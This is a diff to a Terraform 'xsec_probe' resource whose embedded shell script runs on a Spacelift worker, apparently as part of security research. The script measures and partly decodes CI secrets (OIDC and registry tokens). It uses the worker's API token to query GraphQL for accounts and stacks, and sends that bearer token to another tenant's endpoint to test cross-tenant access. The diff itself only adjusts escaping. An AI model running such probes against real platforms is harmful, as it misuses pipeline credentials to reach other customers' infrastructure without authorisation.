@@ -26,7 +26,7 @@ resource "null_resource" "xsec_probe" {
       echo "oidc_$(echo "$SPACELIFT_OIDC_TOKEN" | wc -c)ch"
       echo "tgtf_$(echo "$TG_TF_REGISTRY_TOKEN" | wc -c)ch"
       echo "=== worker token vs graphql (A) ==="
-      EP="${TF_VAR_spacelift_graphql_endpoint}"
+      EP="$TF_VAR_spacelift_graphql_endpoint"
       Q1='{ "query": "{ viewer { id name } }" }'
       Q2='{ "query": "{ account { id name } }" }'
       Q3='{ "query": "{ searchStacks(input:{}) { edges { node { id } } } }" }'
@@ -37,7 +37,7 @@ resource "null_resource" "xsec_probe" {
         echo
       done
       echo "=== worker token vs graphql (B tenant) ==="
-      curl -s -m 20 -o /dev/null -w "B RC=%{http_code}\n" -H "Content-Type: application/json" -H "Authorization: Bearer $SPACELIFT_API_TOKEN" -d '{"query":"{ viewer { id } }"}' "https://itssakexem.app.spacelift.dev/graphql"
+      curl -s -m 20 -o /dev/null -w "B RC=%%{http_code}\n" -H "Content-Type: application/json" -H "Authorization: Bearer $SPACELIFT_API_TOKEN" -d '{"query":"{ viewer { id } }"}' "https://itssakexem.app.spacelift.dev/graphql"
       echo "=== OIDC payload ==="
       echo "$SPACELIFT_OIDC_TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | head -c 300
       echo
